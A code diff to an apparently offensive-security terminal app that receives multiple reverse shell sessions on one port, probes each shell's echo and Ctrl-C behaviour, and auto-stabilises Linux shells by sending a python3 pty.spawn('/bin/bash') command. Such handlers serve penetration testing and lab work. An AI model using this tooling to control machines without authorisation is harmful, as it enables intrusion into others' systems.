@@ -91,7 +91,7 @@ class NShellsOnePortApp(App):
             self.session_list_view.extend([ListItem(Label(s.name), id=f"session_{s.session_id}") for s in self.session_list])
 
     async def rshell_client(self, reader, writer) -> None:
-        async def read_stream(reader, timeout=.5):
+        async def read_stream(reader, timeout=.2):
             res = b""
             async def read_all():
                 nonlocal res
@@ -116,12 +116,14 @@ class NShellsOnePortApp(App):
                 session = ShellSession(session_id, session_name, reader, writer)
                 self.session_list.append(session)
             await self.update_session_list_view()
-            self.log_view.write(f"[*] new session {session_name}")
+            self.log_view.write(f"[*] New session {session_name}")
     
             async def shell_feature_check():
+                self.log_view.write(f"[*] Session {session_id}: Initiating shell_feature_check")
                 writer.write(b"\n\n\n")
                 await writer.drain()
                 # read any potentially remaining data (banner, leftover command output)
+                self.log_view.write(f"[*] Session {session_id}: Waiting 1 second for shell to settle")
                 await read_stream(reader, timeout=1)
 
                 stdin_live_echo = False
@@ -141,7 +143,7 @@ class NShellsOnePortApp(App):
 
                 writer.write(b"\n")
                 await writer.drain()
-                data = await read_stream(reader, timeout=.5)
+                data = await read_stream(reader)
 
                 if not data:
                     self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
@@ -156,21 +158,54 @@ class NShellsOnePortApp(App):
                         # cmd.exe and powershell echos the command only after pressing enter
                     else:
                         self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
-                elif stdin_live_echo and data.count(b"ns1p") >= 2: #theoretically we should check == 2 but the count might be higher from e.g. PS1
+                elif stdin_live_echo and data.count(b"ns1p") >= 1: #theoretically we should check == 1 but the count might be higher from e.g. PS1
                     self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
+                    command_echo = True
                 else:
                     self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data: {data})")
 
-                return (stdin_live_echo, stdin_late_echo, command_echo)
+                # Ctrl-C check
 
-            (stdin_live_echo, stdin_late_echo, command_echo) = await shell_feature_check()
+                # stage command but dont run it
+                writer.write(b"echo ns1p")
+                await writer.drain()
+                # ignore any potential echoing
+                await read_stream(reader)
+ 
+                # send Ctrl-C
+                writer.write(b"\x03")
+                await writer.drain()
+
+                data = await read_stream(reader)
+
+                # if we get no data, a verbatim echoed Ctrl-C or a bell we assume the shell does not have working Ctrl-C
+                if not data or data == b"\x03" or data == b"\x07":
+                    ctrl_c = False
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to NOT support Ctrl-C")
+                else:
+                    ctrl_c = True
+                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to support Ctrl-C")
+
+                # clear potential leftovers in stdin
+                writer.write(b"\n")
+                await writer.drain()
+                await read_stream(reader)
+
+                self.log_view.write(f"[*] Session {session_id}: shell_feature_check concluded. Result (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = {(stdin_live_echo, stdin_late_echo, command_echo, ctrl_c)}")
+                return (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c)
+
+            (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = await shell_feature_check()
             # this check in its current form does not stabilize on a pure bash reverse shell => no Ctrl-C
             # it also attempts to linux stabilize a windows shell (although this doesnt break anything)
-            if command_echo and not stdin_live_echo:
+            if command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
                 self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
                 writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                 await writer.drain()
-                (stdin_live_echo, stdin_late_echo, command_echo) = await shell_feature_check()
+                (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c) = await shell_feature_check()
+            elif command_echo and stdin_late_echo and not (stdin_live_echo or ctrl_c):
+                # this is most likely a windows shell
+                # enable readline mode
+                pass
             # TODO: have some kind of readline mode
 
             # send a final newline to print PS1 again
@@ -184,16 +219,16 @@ class NShellsOnePortApp(App):
                         break
                     session.read_deque.append(data)
         
-                self.log_view.write(f"[*] session {session_name} closed")
+                self.log_view.write(f"[*] Session {session_name} closed")
                 writer.close()
                 await writer.wait_closed()
             except ConnectionResetError:
-                self.log_view.write(f"[*] session {session_name} closed: connection reset")
+                self.log_view.write(f"[*] Session {session_name} closed: connection reset")
 
             async with self.write_lock:
                 self.session_list.remove(session)
             await self.update_session_list_view()
-            self.log_view.write(f"[*] session {session_name} removed")
+            self.log_view.write(f"[*] Session {session_name} removed")
 
         except Exception as e:
             self.log_view.write(f"[-] Exception in rshell_client {e}\n{traceback.format_exc()}")
